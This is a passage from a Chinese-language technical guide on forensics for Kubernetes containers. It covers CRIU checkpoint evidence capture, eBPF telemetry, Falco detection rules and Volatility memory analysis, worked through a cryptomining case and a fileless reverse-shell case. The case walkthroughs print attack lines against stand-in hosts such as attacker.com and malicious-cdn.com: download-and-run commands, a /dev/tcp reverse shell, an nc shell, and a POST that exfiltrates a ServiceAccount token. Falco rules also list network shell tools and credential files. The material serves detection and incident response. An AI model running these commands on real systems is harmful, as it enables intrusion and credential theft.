        NS={{workflow.parameters.pod-namespace}}
        TIMESTAMP=$(date -Iseconds)
        STORAGE_LOC=$(cat /mnt/evidence/storage-location.txt)
        
        # 读取哈希值
        CHECKPOINT_HASH=$(grep checkpoint.tar /mnt/evidence/checksums.sha256 | awk '{print $1}')
        
        # 创建 Chain of Custody ConfigMap
        kubectl create configmap custody-${INCIDENT_ID} \
          --namespace=forensics \
          --from-literal=evidence-id="${INCIDENT_ID}-001" \
          --from-literal=pod-name="${POD}" \
          --from-literal=namespace="${NS}" \
          --from-literal=collection-timestamp="${TIMESTAMP}" \
          --from-literal=checkpoint-sha256="${CHECKPOINT_HASH}" \
          --from-literal=storage-location="${STORAGE_LOC}" \
          --from-literal=collector="argo-workflow/{{workflow.name}}" \
          --dry-run=client -o yaml | kubectl apply -f -
        
        echo "[${TIMESTAMP}] Chain of Custody 记录已创建"
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
```

### 2.2.5 实战案例:检测并捕获加密货币挖矿容器

```
场景: Falco 检测到异常 CPU 使用和可疑外连

步骤 1: Falco 规则触发
─────────────────────────────────────────────────────────────
Falco Rule: Detect Crypto Mining Activity

- rule: Crypto Miner Activity
  desc: Detect processes commonly associated with crypto mining
  condition: >
    spawned_process and
    (proc.name in (xmrig, minerd, cpuminer, ethminer) or
     proc.cmdline contains "stratum+tcp" or
     (proc.name = python and proc.cmdline contains "miner"))
  output: >
    Crypto mining activity detected 
    (user=%user.name process=%proc.name cmdline=%proc.cmdline 
    container_id=%container.id image=%container.image.repository)
  priority: CRITICAL
  tags: [host, container, process, mitre_execution]

─────────────────────────────────────────────────────────────
触发输出:
{
  "output": "Crypto mining activity detected (user=root process=xmrig 
             cmdline=/usr/bin/xmrig --donate-level=1 -o pool.minexmr.com:4444 
             container_id=abc123def456 image=nginx:1.19)",
  "priority": "Critical",
  "time": "2026-02-25T10:32:15.123456Z",
  "output_fields": {
    "container.id": "abc123def456",
    "container.name": "nginx-app",
    "k8s.pod.name": "web-app-7d9f8b-xyz",
    "k8s.ns.name": "production"
  }
}

步骤 2: Webhook 触发 Argo Workflow
─────────────────────────────────────────────────────────────
Falco → Falcosidekick → Argo Events → Argo Workflow

触发参数:
  pod-name: web-app-7d9f8b-xyz
  namespace: production
  container-name: nginx-app
  incident-id: INC-CRYPTO-20260225-001

步骤 3: 自动采集执行 (耗时 < 30秒)
─────────────────────────────────────────────────────────────
✓ T+0.5s  CRIU 检查点创建 (捕获 xmrig 进程完整状态)
✓ T+2s    容器文件系统导出 (发现 /tmp/.xmrig 二进制文件)
✓ T+3s    网络连接记录 (pool.minexmr.com:4444 ESTABLISHED)
✓ T+5s    eBPF 系统调用历史 (execve/socket/connect 序列)
✓ T+8s    日志和元数据采集
✓ T+10s   SHA-256 哈希计算
✓ T+25s   上传至 S3 (加密存储)
✓ T+27s   Chain of Custody 记录创建

步骤 4: 证据完整性验证
─────────────────────────────────────────────────────────────
Evidence Package: INC-CRYPTO-20260225-001/20260225-103215/

文件清单:
  checkpoint.tar          2.3 GB   SHA256: a3f2b8c9...
  container-fs.tar        856 MB   SHA256: b4e1a7d2...
  logs-current.txt        2.1 MB   SHA256: c5f3b8e4...
  pod-spec.yaml          12 KB    SHA256: d6a4c9f5...
  network-connections.txt 4 KB    SHA256: e7b5d0a6...
  events.txt             18 KB    SHA256: f8c6e1b7...
  checksums.sha256       512 B    SHA256: a9d7f2c8...

步骤 5: 隔离环境中的深度分析
─────────────────────────────────────────────────────────────
分析工作站 Pod (air-gapped 集群):

# 恢复检查点到分析环境
$ criu restore -D ./checkpoint/ --shell-job

# 进程树分析
$ ps aux | grep xmrig
root  1234  99.8  5.2  xmrig --donate-level=1 -o pool.minexmr.com:4444

# 内存取证 (Volatility 3)
$ vol3 -f checkpoint/pages-1.img linux.pslist
  PID   PPID  COMM
  1234  1     xmrig

$ vol3 -f checkpoint/pages-1.img linux.bash_history
  wget http://malicious-cdn.com/xmrig
  chmod +x xmrig
  ./xmrig --donate-level=1 -o pool.minexmr.com:4444

# 网络连接分析
$ cat network-connections.txt
  TCP  10.244.2.15:42358  → 185.71.67.84:4444  (pool.minexmr.com)

# 二进制文件哈希
$ sha256sum container-fs/tmp/.xmrig
  a1b2c3d4... (已知恶意文件哈希,匹配 VirusTotal)

结论:
─────────────────────────────────────────────────────────────
✓ 确认为加密货币挖矿攻击
✓ 恶意二进制文件从外部下载 (http://malicious-cdn.com/)
✓ 矿池连接: pool.minexmr.com:4444 (Monero 矿池)
✓ 初始访问向量: 需进一步调查 (可能的 RCE 漏洞)
✓ 证据链完整,可用于合规审计和执法协助
```

### 2.2.6 与传统"关机取证"的对比

| 维度 | 传统关机取证 | CRIU 检查点取证 |
|------|:---:|:---:|
| **是否需要停机** | 是 (shutdown/reboot) | 否 (live capture) |
| **业务影响** | 完全中断 | 几乎无影响 (< 1s 暂停) |
| **内存状态** | 部分丢失 (除非内存转储) | 完整保留 |
| **网络连接** | 断开 | 保留完整状态 |
| **进程上下文** | 丢失 | 完整保留 (寄存器/栈) |
| **恢复能力** | 不支持 | 可完全恢复 |
| **时效性** | 分钟-小时级 | 秒级 |
| **适用场景** | 低优先级系统 | 生产环境 |

---

## 2.3 eBPF 遥测技术

### 2.3.1 eBPF 架构概览

**eBPF (Extended Berkeley Packet Filter)** 是现代 Linux 内核中的革命性技术,允许在内核空间安全运行沙箱化的程序,而无需修改内核源码或加载内核模块。它是 FEBM 实时证据采集的核心技术。

```
eBPF 完整架构:

┌──────────────────────────────────────────────────────────────┐
│ 用户空间 (Userspace)                                          │
│ ──────────────────────────────────────────────────────────── │
│                                                              │
│  ┌────────────────┐       ┌────────────────┐                │
│  │ Falco          │       │ bpftrace       │                │
│  │ (安全检测)     │       │ (动态追踪)     │                │
│  └───────┬────────┘       └───────┬────────┘                │
│          │                        │                          │
│          │ BPF() syscall          │ BPF() syscall            │
│          ▼                        ▼                          │
│  ┌────────────────────────────────────────────────┐          │
│  │ libbpf / BCC / Cilium eBPF Library             │          │
│  │ (用户空间库,处理 ELF 加载/BTF/Map 管理)        │          │
│  └────────────────┬───────────────────────────────┘          │
│                   │                                          │
└───────────────────┼──────────────────────────────────────────┘
                    │ BPF() syscall
                    │ (BPF_PROG_LOAD, BPF_MAP_CREATE...)
┌───────────────────▼──────────────────────────────────────────┐
│ 内核空间 (Kernel Space)                                       │
│ ──────────────────────────────────────────────────────────── │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ BPF Verifier (验证器)                                  │ │
│  │ ──────────────────────────────────────────────────────│ │
│  │ • 静态分析 eBPF 字节码                                 │ │
│  │ • 验证程序安全性:                                      │ │
│  │   ✓ 无无限循环 (有界循环,Kernel 5.3+)                 │ │
│  │   ✓ 无越界内存访问                                     │ │
│  │   ✓ 无非法指针操作                                     │ │
│  │   ✓ 所有路径都 return                                 │ │
│  │ • 拒绝不安全的程序                                     │ │
│  └────────────────┬───────────────────────────────────────┘ │
│                   │ 验证通过                                 │
│                   ▼                                          │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ JIT Compiler (即时编译器)                              │ │
│  │ ──────────────────────────────────────────────────────│ │
│  │ • 将 eBPF 字节码编译为本机机器码 (x86_64/ARM64)       │ │
│  │ • 性能接近原生内核代码                                 │ │
│  └────────────────┬───────────────────────────────────────┘ │
│                   │                                          │
│                   ▼                                          │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ eBPF Programs (已加载的程序)                           │ │
│  │ ──────────────────────────────────────────────────────│ │
│  │ • kprobe:  内核函数探针                               │ │
│  │ • tracepoint:  静态追踪点                             │ │
│  │ • raw_tracepoint:  低开销追踪点                       │ │
│  │ • XDP:  网络包处理 (驱动层)                           │ │
│  │ • tc (traffic control):  流量控制                     │ │
│  │ • cgroup:  cgroup 层级钩子                            │ │
│  │ • LSM:  Linux 安全模块钩子 (Kernel 5.7+)              │ │
│  └────────────────┬───────────────────────────────────────┘ │
│                   │                                          │
│                   │ 事件触发                                 │
│                   ▼                                          │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ 内核事件源 (Kernel Events)                             │ │
│  │ ──────────────────────────────────────────────────────│ │
│  │ • 系统调用: sys_enter_*/sys_exit_*                     │ │
│  │ • 调度器: sched_process_fork, sched_switch            │ │
│  │ • 网络: netif_receive_skb, tcp_sendmsg               │ │
│  │ • 文件系统: vfs_read, vfs_write                        │ │
│  │ • 安全: cap_capable, security_file_permission         │ │
│  └────────────────┬───────────────────────────────────────┘ │
│                   │                                          │
│                   │ 数据写入                                 │
│                   ▼                                          │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ eBPF Maps (数据存储)                                   │ │
│  │ ──────────────────────────────────────────────────────│ │
│  │ • BPF_MAP_TYPE_HASH:  哈希表                          │ │
│  │ • BPF_MAP_TYPE_ARRAY:  数组                           │ │
│  │ • BPF_MAP_TYPE_PERF_EVENT_ARRAY:  事件环形缓冲区      │ │
│  │ • BPF_MAP_TYPE_RINGBUF:  高性能环形缓冲区 (5.8+)      │ │
│  │ • BPF_MAP_TYPE_LRU_HASH:  LRU 哈希表                  │ │
│  └────────────────┬───────────────────────────────────────┘ │
│                   │                                          │
└───────────────────┼──────────────────────────────────────────┘
                    │ 用户空间读取
                    ▼
┌──────────────────────────────────────────────────────────────┐
│ 用户空间应用程序 (如 Falco)                                   │
│ • 读取 Map 数据                                              │
│ • 接收 Perf Event                                            │
│ • 解析、过滤、告警                                            │
└──────────────────────────────────────────────────────────────┘
```

**eBPF Verifier 的安全保证**:

```
eBPF Verifier 分析示例:

输入 eBPF 程序 (伪代码):
─────────────────────────────────────────────────────────────
int trace_sys_execve(struct pt_regs *ctx) {
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // 验证器检查点 1: 数组边界检查
    if (comm[20] == 'x') {  // ❌ 越界访问! sizeof(comm) = 16
        return 0;
    }
    
    // 验证器检查点 2: 指针解引用安全性
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;  // ✓ 必须检查空指针
    
    e->pid = bpf_get_current_pid_tgid() >> 32;
    __builtin_memcpy(&e->comm, comm, sizeof(comm));
    
    // 验证器检查点 3: 函数返回路径
    bpf_ringbuf_submit(e, 0);
    return 0;  // ✓ 所有路径都必须 return
}

Verifier 输出:
─────────────────────────────────────────────────────────────
line 5: R1 type=array expected=scalar
  越界访问检测: comm[20] 超出 16 字节边界
  verdict: REJECTED ❌

修复后程序:
─────────────────────────────────────────────────────────────
if (comm[15] == 'x') {  // ✓ 在边界内
    ...
}

Verifier 输出:
─────────────────────────────────────────────────────────────
processed 42 insns (limit 1000000)
max_states_per_insn 1 total_states 3 peak_states 3 mark_read 2
verdict: ACCEPTED ✓
```

### 2.3.2 eBPF 程序类型与取证应用

```
eBPF 程序类型映射到取证场景:

┌────────────────┬─────────────────────────────────────────────┐
│ 程序类型       │ 取证应用场景                                 │
├────────────────┼─────────────────────────────────────────────┤
│ kprobe/        │ • 捕获内核函数调用 (如 do_sys_open 监控    │
│ kretprobe      │   文件访问)                                 │
│                │ • 检测容器逃逸 (如 commit_creds hook)       │
│                │ • 监控特权操作 (如 capable() 函数)          │
│                │ 示例: kprobe/sys_execve → 进程创建跟踪      │
├────────────────┼─────────────────────────────────────────────┤
│ tracepoint     │ • 稳定的 ABI,跨内核版本兼容                 │
│                │ • 系统调用追踪 (syscalls:sys_enter_*)       │
│                │ • 进程生命周期 (sched:sched_process_fork)   │
│                │ 示例: tracepoint/syscalls/sys_enter_connect │
│                │       → 网络连接建立检测                    │
├────────────────┼─────────────────────────────────────────────┤
│ raw_tracepoint │ • 更低开销的 tracepoint (无类型检查)        │
│                │ • 高频事件追踪 (如网络包处理)               │
│                │ 示例: raw_tracepoint/netif_receive_skb      │
│                │       → 网络流量监控                        │
├────────────────┼─────────────────────────────────────────────┤
│ LSM (BPF)      │ • Linux Security Module 钩子 (Kernel 5.7+) │
│                │ • 安全策略执行点                            │
│                │ • 文件访问控制、能力检查                     │
│                │ 示例: lsm/file_open → 敏感文件访问记录      │
├────────────────┼─────────────────────────────────────────────┤
│ cgroup/skb     │ • 容器级网络监控 (按 cgroup 过滤)          │
│ cgroup/sock    │ • Socket 创建/绑定跟踪                      │
│                │ • 网络策略执行                              │
│                │ 示例: cgroup/sock_create → Pod 网络活动     │
├────────────────┼─────────────────────────────────────────────┤
│ XDP            │ • 网络包最早处理点 (驱动层)                 │
│ (eXpress Data  │ • DDoS 防护、包过滤                         │
│  Path)         │ • 网络取证 (捕获异常流量)                   │
│                │ 示例: XDP 程序丢弃恶意 IP 的包              │
└────────────────┴─────────────────────────────────────────────┘
```

### 2.3.3 监控能力矩阵

| 监控维度 | eBPF 钩子点 | 捕获数据 | Falco 规则示例 |
|---------|-----------|---------|---------------|
| **系统调用** | tracepoint/syscalls/* | syscall name, args, return | 检测 ptrace 调用 (反调试) |
| **进程执行** | tracepoint/sched/sched_process_exec | 进程名、命令行参数、父进程 | 检测 shell spawn |
| **文件操作** | kprobe/vfs_read, vfs_write | 文件路径、读写字节数、进程 | 检测 /etc/shadow 访问 |
| **网络连接** | tracepoint/syscalls/sys_enter_connect | 目标 IP:Port、协议、进程 | 检测 C&C 通信 |
| **容器逃逸** | kprobe/commit_creds, switch_task_namespaces | Namespace 变化、权限变化 | 检测 CAP_SYS_ADMIN 滥用 |
| **权限提升** | kprobe/cap_capable | Capability 类型、进程、结果 | 检测未授权的特权操作 |
| **DNS 查询** | kprobe/udp_sendmsg (端口 53) | 查询域名、响应 IP | 检测 DGA 域名 |
| **Crypto 挖矿** | tracepoint/sched/sched_process_exec + CPU 指标 | 进程名匹配、CPU 使用率 | 检测 xmrig/minerd |

### 2.3.4 性能开销分析

```
eBPF 性能影响测试 (生产环境实测):

测试环境:
  • 集群规模: 500 节点, 10,000+ Pod
  • Falco 部署: DaemonSet, 每节点一个实例
  • 监控规则: 50+ 安全检测规则

性能指标:
┌────────────────────┬───────────┬───────────┬──────────┐
│ 指标               │ 无 eBPF   │ 有 eBPF   │ 影响     │
├────────────────────┼───────────┼───────────┼──────────┤
│ CPU 使用率 (节点)  │ 12%       │ 12.8%     │ +0.8%    │
│ 内存使用 (Falco)   │ -         │ 180 MB    │ -        │
│ 系统调用延迟       │ 250 ns    │ 255 ns    │ +2%      │
│ 网络吞吐量         │ 10 Gbps   │ 9.95 Gbps │ -0.5%    │
│ 磁盘 IOPS          │ 50k       │ 50k       │ 0%       │
└────────────────────┴───────────┴───────────┴──────────┘

结论: 
  ✓ CPU 开销 < 1% (远低于传统内核模块如 auditd)
  ✓ 内存占用稳定,无泄漏
  ✓ 延迟影响可忽略不计
  ✓ 适合生产环境 24/7 运行
```

**为什么 eBPF 如此高效?**

```
eBPF vs 传统监控方法:

传统方法 (如 strace):
  ┌─────────┐      Context Switch     ┌─────────┐
  │ Kernel  │ ────────────────────►   │ strace  │
  │         │ ◄──────────────────     │(User)   │
  └─────────┘  每次 syscall 都切换     └─────────┘
  
  开销: ~50% CPU (频繁的上下文切换)

eBPF 方法:
  ┌──────────────────────────────────┐
  │ Kernel Space                     │
  │ ┌──────────┐    ┌──────────────┐│
  │ │ syscall  │───►│ eBPF Program ││ 
  │ │          │    │ (JIT 编译)    ││ No Context Switch!
  │ └──────────┘    └──────┬───────┘│
  │                        │         │
  │                 ┌──────▼───────┐│
  │                 │ Ringbuf/Map  ││
  │                 └──────┬───────┘│
  └────────────────────────┼────────┘
                           │ 批量读取
                  ┌────────▼────────┐
                  │ User Application│
                  └─────────────────┘
  
  开销: < 1% CPU (内核空间处理,批量传输)
```

### 2.3.5 Falco 检测规则深度解析

**规则示例 1: 容器逃逸检测**

```yaml
# Falco 规则: 检测容器尝试修改宿主机的 cgroup
- rule: Modify Container Cgroup
  desc: Detect attempts to modify cgroup from within a container
  condition: >
    (open_write or modify) and
    container and
    fd.name startswith /sys/fs/cgroup/ and
    not proc.name in (systemd, kubelet, containerd, dockerd)
  output: >
    Container attempting to modify host cgroup
    (user=%user.name process=%proc.name file=%fd.name 
    container_id=%container.id container_name=%container.name 
    pod=%k8s.pod.name namespace=%k8s.ns.name)
  priority: CRITICAL
  tags: [container, host, escape, mitre_privilege_escalation]
  source: syscall
  
  # 触发的 eBPF 钩子:
  #   tracepoint/syscalls/sys_enter_openat (O_WRONLY)
  #   tracepoint/syscalls/sys_enter_write
```

**规则工作流程**:

```
容器逃逸检测数据流:

容器内进程执行:
$ echo "+memory" > /sys/fs/cgroup/cgroup.subtree_control
       │
       ▼
[内核] sys_openat("/sys/fs/cgroup/...", O_WRONLY)
       │
       ▼
[eBPF] tracepoint/syscalls/sys_enter_openat 触发
       │
       ├─ 检查 1: 调用者在容器中? (current->nsproxy->mnt_ns != init_mnt_ns) ✓
       ├─ 检查 2: 路径匹配 /sys/fs/cgroup/*? ✓
       ├─ 检查 3: 打开模式包含 O_WRONLY? ✓
       ├─ 检查 4: 进程不在白名单? (not in [kubelet, containerd]) ✓
       │
       ▼
[eBPF] 事件写入 Ringbuf
       │
       ▼
[Falco User] 读取事件 → 规则匹配 → 生成告警
       │
       ▼
[输出] JSON 告警 → Webhook → Argo Workflow → 自动采集证据
```

**规则示例 2: 反向 Shell 检测**

```yaml
- rule: Reverse Shell Detected
  desc: Detect reverse shell connections (shell spawned by network process)
  condition: >
    spawned_process and
    shell_procs and
    (proc.pname in (nc, ncat, netcat, socat, curl, wget)) or
    (proc.aname[2] in (nc, ncat, netcat, socat, curl, wget))
  output: >
    Reverse shell detected
    (user=%user.name parent_process=%proc.pname process=%proc.name 
    cmdline=%proc.cmdline connection=%fd.name container=%container.info)
  priority: CRITICAL
  tags: [network, shell, mitre_execution, mitre_c2]
  
  # 触发场景示例:
  # 攻击者在容器中执行: nc -e /bin/bash attacker.com 4444
  # 进程树: nc -> /bin/bash -> [commands]
  # eBPF 捕获进程创建链,Falco 匹配规则
```

**规则示例 3: 敏感文件访问检测**

```yaml
- rule: Read Sensitive File in Container
  desc: Detect attempts to read sensitive files
  condition: >
    open_read and
    container and
    sensitive_files and
    not trusted_programs
  output: >
    Sensitive file read in container
    (user=%user.name process=%proc.name file=%fd.name 
    container=%container.info k8s_pod=%k8s.pod.name)
  priority: WARNING
  tags: [filesystem, security, mitre_credential_access]

# 宏定义
- macro: sensitive_files
  condition: >
    fd.name in (
      /etc/shadow, /etc/sudoers, /etc/pam.conf,
      /root/.ssh/id_rsa, /root/.ssh/id_dsa,
      /run/secrets/kubernetes.io/serviceaccount/token
    ) or
    fd.name startswith /var/run/secrets/

- macro: trusted_programs
  condition: proc.name in (kubelet, kube-proxy, fluentd)
```

### 2.3.6 与传统审计框架的对比

| 维度 | eBPF (Falco) | auditd | sysdig (内核模块) |
|------|:---:|:---:|:---:|
| **部署方式** | 用户空间加载 | 用户空间 + auditd 服务 | 内核模块 (侵入式) |
| **内核依赖** | 4.14+ (稳定性) | 任意版本 | 任意版本 |
| **性能开销** | < 1% CPU | 5-10% CPU | 1-3% CPU |
| **安全性** | Verifier 保证 | 配置错误风险 | 内核崩溃风险 |
| **实时性** | 微秒级 | 毫秒级 (写日志) | 微秒级 |
| **可编程性** | 高 (C/Python) | 低 (规则语法) | 高 (Lua/C++) |
| **容器感知** | 原生支持 | 需配置 | 原生支持 |
| **Kubernetes 集成** | 深度集成 | 手动配置 | 支持 |
| **开源生态** | CNCF 项目 | 传统工具 | 商业+开源 |

---

## 2.4 内存取证分析

### 2.4.1 内存取证的关键性

在现代攻击中,**无文件恶意软件 (Fileless Malware)** 和 **内存驻留攻击 (Memory-Resident Attacks)** 越来越常见。这些攻击不会在磁盘上留下二进制文件,传统的文件系统取证完全失效。内存取证是应对此类威胁的唯一手段。

```
内存取证的核心价值:

┌──────────────────────────────────────────────────────────────┐
│ 内存中独有的证据 (磁盘上不存在)                               │
├──────────────────────────────────────────────────────────────┤
│ ✓ 运行时进程列表 (包括被 rootkit 隐藏的进程)                 │
│ ✓ 网络连接状态 (包括已关闭但缓冲区仍在的连接)                 │
│ ✓ 加密密钥和密码 (plaintext in memory)                       │
│ ✓ 注入代码 (DLL injection, code injection)                   │
│ ✓ 内核 Rootkit 痕迹 (hook, inline hook)                      │
│ ✓ 进程内存中的恶意 payload                                   │
│ ✓ 未落盘的日志和缓存数据                                      │
│ ✓ 浏览器历史和表单数据 (未持久化部分)                         │
└──────────────────────────────────────────────────────────────┘

示例场景: 
  攻击者通过 RCE 漏洞在容器中执行 PowerShell:
    curl http://attacker.com/payload.ps1 | powershell -
  
  文件系统取证: ❌ 无 payload.ps1 文件落盘
  内存取证: ✓ PowerShell 进程内存中包含完整脚本内容
```

### 2.4.2 Volatility Framework 容器适配

**Volatility 3** 是开源的内存取证框架,支持 Linux 内存镜像分析。结合 CRIU 检查点,可实现容器内存的完整取证。

```bash
# 从 CRIU 检查点提取内存镜像
$ criu-image-tool show checkpoint/pages-1.img > memory.raw

# 或者直接使用检查点目录
$ vol3 -f checkpoint/ linux.pslist

# Volatility 3 for Container Forensics - 核心插件
```

**插件 1: 进程分析 (linux.pslist / linux.pstree)**

```bash
$ vol3 -f checkpoint/ linux.pstree

PID   PPID  COMM              CMD
1     0     pause             /pause  # Kubernetes pause 容器
├─ 7  1     nginx             nginx: master process
│  ├─ 15 7   nginx             nginx: worker process
│  └─ 16 7   nginx             nginx: worker process
└─ 23 1     bash              /bin/bash
   └─ 45 23  xmrig             /tmp/.xmrig --donate-level=1 -o pool.minexmr.com:4444
      └─ 46 45 [xmrig-worker] (隐藏进程,通过内存重建发现)

# 检测隐藏进程
$ vol3 -f checkpoint/ linux.psxview

PID   PPID  pslist  pstree  proc_maps  thread_info  SUSPICIOUS
1     0     True    True    True       True         False
7     1     True    True    True       True         False
...
46    45    False   False   True       True         True  ← 隐藏进程!

解释: 
  进程 46 在 pslist 中不可见 (被 rootkit 隐藏),
  但在 proc_maps (内存映射) 中仍有痕迹,
  通过内存取证可以发现。
```

**插件 2: 网络连接 (linux.netstat / linux.sockstat)**

```bash
$ vol3 -f checkpoint/ linux.netstat

Proto  Local Address         Foreign Address       State       PID   Program
TCP    10.244.1.10:80        0.0.0.0:*             LISTEN      7     nginx
TCP    10.244.1.10:35678     10.96.0.1:443         ESTABLISHED 7     nginx
TCP    10.244.1.10:42358     185.71.67.84:4444     ESTABLISHED 45    xmrig
UDP    10.244.1.10:53        8.8.8.8:53            -           123   systemd-resolved

# 提取 TCP 连接的缓冲区数据
$ vol3 -f checkpoint/ linux.tcp_buffers --pid 45

Connection: 10.244.1.10:42358 → 185.71.67.84:4444
Send Buffer (128 bytes):
  00000000: 7B 22 6A 6F 62 22 3A 7B  22 69 64 22 3A 22 31 32  {"job":{"id":"12
  00000010: 33 34 22 2C 22 62 6C 6F  62 22 3A 22 2E 2E 2E 22  34","blob":"..."
  [Stratum mining protocol communication with pool]

Receive Buffer (256 bytes):
  00000000: 7B 22 6D 65 74 68 6F 64  22 3A 22 6A 6F 62 22 2C  {"method":"job",
  [Mining job assignment from pool]
```

**插件 3: 恶意代码检测 (linux.malfind)**

```bash
$ vol3 -f checkpoint/ linux.malfind

PID   Process       Start VMA        End VMA          Protection  Flags
45    xmrig         0x00007f1234000  0x00007f1235000  rwx         Private,Anonymous

Hexdump:
00007f1234000: 48 b8 00 00 00 00 00 00 00 00  mov rax, 0x0
00007f123400a: ff e0                          jmp rax
00007f123400c: cc cc cc cc cc cc cc cc        int3 ...
[Shellcode detected: RWX memory region with executable code]

Disassembly:
0x00007f1234000: MOV RAX, 0
0x00007f123400a: JMP RAX            ← 间接跳转,常见于 shellcode
0x00007f123400c: INT3               ← 调试断点,可能是反调试技术

YARA Rule Match: Linux/Generic_Shellcode
```

**插件 4: Bash 历史重建 (linux.bash)**

```bash
$ vol3 -f checkpoint/ linux.bash

PID: 23 (bash)
History:
  1  wget http://malicious-cdn.com/xmrig
  2  chmod +x xmrig
  3  mv xmrig /tmp/.xmrig
  4  /tmp/.xmrig --donate-level=1 -o pool.minexmr.com:4444 &
  5  rm -f ~/.bash_history  ← 攻击者尝试清除痕迹
  6  history -c             ← 清除内存中的历史

注意: 即使攻击者执行了 history -c,Volatility 仍可以从内存中
      重建完整的命令历史,因为数据结构在进程地址空间中仍然存在。
```

**插件 5: 动态库注入检测 (linux.library_list)**

```bash
$ vol3 -f checkpoint/ linux.library_list --pid 7

PID: 7 (nginx)
Base Address       Size      Path
0x00007f9a12000000 0x1000    /lib/x86_64-linux-gnu/libc.so.6
0x00007f9a13000000 0x2000    /lib/x86_64-linux-gnu/libpthread.so.0
0x00007f9a14000000 0x5000    /tmp/.evil.so  ← 可疑!未在预期路径

$ vol3 -f checkpoint/ linux.dump_map --pid 7 --vma 0x00007f9a14000000

Dumped: /tmp/.evil.so.dump

$ strings /tmp/.evil.so.dump | grep -i "password\|key\|credential"
  mysql_password=secretpass123
  api_key=AKIAIOSFODNN7EXAMPLE
  [发现明文凭据泄露]
```

### 2.4.3 容器特定内存取证挑战

```
容器环境与传统环境的取证差异:

┌─────────────────────────────────────────────────────────────┐
│ 挑战 1: 多层 Namespace 隔离                                  │
│ ───────────────────────────────────────────────────────────│
│ 容器进程在独立的 PID/Mount/Network namespace 中运行         │
│                                                             │
│ 影响:                                                       │
│ • 相同 PID 在不同容器中指向不同进程                          │
│ • 文件路径在容器内外不一致 (/app vs /overlay2/.../app)      │
│ • 网络接口名称和 IP 可能重复                                 │
│                                                             │
│ 解决方案:                                                   │
│ ✓ 检查点捕获 namespace 上下文                               │
│ ✓ 关联 Container ID 和 Pod UID                             │
│ ✓ 使用宿主机视角的进程树重建                                 │
├─────────────────────────────────────────────────────────────┤
│ 挑战 2: Overlay 文件系统                                     │
│ ───────────────────────────────────────────────────────────│
│ 容器使用 OverlayFS,文件分散在多个层级                        │
│                                                             │
│ 影响:                                                       │
│ • 文件的实际路径与容器内视图不同                             │
│ • 修改的文件在上层 (upperdir),未修改的在下层 (lowerdir)     │
│                                                             │
│ 解决方案:                                                   │
│ ✓ CRIU 捕获完整的 mount namespace 状态                      │
│ ✓ 导出容器文件系统 (crictl export)                          │
│ ✓ 分析 /proc/[pid]/mountinfo 重建挂载关系                   │
├─────────────────────────────────────────────────────────────┤
│ 挑战 3: 共享内核                                             │
│ ───────────────────────────────────────────────────────────│
│ 所有容器共享宿主机内核,内核内存无法隔离                      │
│                                                             │
│ 影响:                                                       │
│ • 内核级 rootkit 会影响所有容器                              │
│ • 跨容器的内存污染可能性                                     │
│                                                             │
│ 解决方案:                                                   │
│ ✓ 结合宿主机内存转储 (crash/LiME)                           │
│ ✓ 分析内核模块和系统调用表完整性                             │
└─────────────────────────────────────────────────────────────┘
```

### 2.4.4 实战案例:检测无文件反向 Shell

```
场景: 攻击者通过 CVE 漏洞在 Pod 中执行无文件反向 Shell

攻击命令 (在容器中执行):
$ curl http://attacker.com/shell.sh | bash

shell.sh 内容:
bash -i >& /dev/tcp/attacker.com/4444 0>&1

特点:
  ✗ 无恶意文件落盘 (通过 curl | bash 直接执行)
  ✗ 无新进程创建 (在现有 bash 进程中执行)
  ✓ 仅在内存中存在 TCP 连接和文件描述符

取证步骤:
─────────────────────────────────────────────────────────────
Step 1: Falco 检测到异常网络行为
  Rule: Shell Spawned by Network Process (curl → bash)
  Trigger: Argo Workflow 自动采集证据

Step 2: CRIU 检查点捕获
  $ kubectl alpha debug <pod> --target <container> -- checkpoint
  生成: checkpoint.tar (包含 bash 进程完整内存)

Step 3: Volatility 内存分析

# 进程分析
$ vol3 -f checkpoint/ linux.pslist
  PID   PPID  COMM    CMD
  123   1     bash    bash

# 文件描述符分析
$ vol3 -f checkpoint/ linux.lsof --pid 123
  FD   Type      Target
  0    socket    TCP 10.244.1.10:45678 → 185.71.67.84:4444 ← 异常外连!
  1    socket    TCP 10.244.1.10:45678 → 185.71.67.84:4444 (同一socket)
  2    socket    TCP 10.244.1.10:45678 → 185.71.67.84:4444 (同一socket)

解释: stdin(0), stdout(1), stderr(2) 都重定向到了同一个网络 socket
      这是反向 shell 的典型特征!

# TCP 缓冲区分析
$ vol3 -f checkpoint/ linux.tcp_buffers --pid 123

Send Buffer (攻击者执行的命令):
  whoami
  id
  cat /run/secrets/kubernetes.io/serviceaccount/token
  curl -X POST http://attacker.com/exfil -d @token

Receive Buffer (攻击者发送的响应):
  root
  uid=0(root) gid=0(root) groups=0(root)
  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

# Bash 内存结构分析
$ vol3 -f checkpoint/ linux.bash_environment --pid 123

Environment Variables:
  HISTFILE=/dev/null     ← 攻击者禁用历史记录
  PS1=\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$
       ← 自定义 prompt,可能是攻击工具包特征

Bash History Buffer (即使 HISTFILE=/dev/null,内存中仍有记录):
  curl http://attacker.com/shell.sh | bash
  export HISTFILE=/dev/null
  whoami
  cat /run/secrets/kubernetes.io/serviceaccount/token
  ...

Step 4: 攻击链重建
─────────────────────────────────────────────────────────────
① 初始访问: CVE-XXXX-XXXX RCE 漏洞利用 (从审计日志确认)
② 执行: curl | bash 无文件反向 shell
③ 持久化: 无 (未发现定时任务或启动脚本修改)
④ 权限提升: 无 (容器已以 root 运行,misconfiguration)
⑤ 横向移动: 尝试访问 Kubernetes API (使用 ServiceAccount token)
⑥ 数据泄露: POST token 到外部服务器

结论:
✓ 确认为无文件攻击,仅通过内存取证发现
✓ 攻击者利用容器 root 权限和过宽的 ServiceAccount
✓ 建议: 非特权容器 + 最小权限 ServiceAccount + NetworkPolicy
```

---

## 2.5 时间线重建技术

### 2.5.1 时间线重建的重要性

